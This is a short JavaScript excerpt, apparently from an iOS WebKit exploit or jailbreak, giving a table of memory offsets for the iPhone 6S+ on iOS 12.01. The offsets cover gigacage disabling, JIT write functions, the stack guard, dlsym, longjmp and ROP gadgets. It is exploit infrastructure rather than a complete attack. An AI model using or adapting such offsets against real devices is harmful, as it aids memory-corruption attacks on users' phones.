...
var Offsets = function Offsets(sw_vers, productname) {
    ...
    offsets["iPhone 6S+"][12.01] = {
        vtable: 0x1fa2a1058,
        disableprimitivegigacage: 0x1881cbf54, //using 6S offsets
        g_gigacagebaseptrs: 0x1b80ec000,
        g_typedarraypoisons: kOFFUnknown,
        startfixedmempool: kOFFUnknown,
        endfixedmempool: kOFFUnknown,
        jit_writeseperateheaps_func: 0x1ba0610d0, //using 6S offsets
        usefastpermissions_jitcopy: 0x1b80f0018, //using 6S offsets
        ptr_stack_check_guard: 0x1b9fa9a18, //using 6S offsets
        dlsym: 0x180923d64,
        longjmp: 0x180adc630,
        callbacks: 0x1b80f01a8, //using 6S offsets
        modelio_popx8: kOFFUnknown,
        linkcode_gadget: 0x188214890 //using 6S offsets
    };
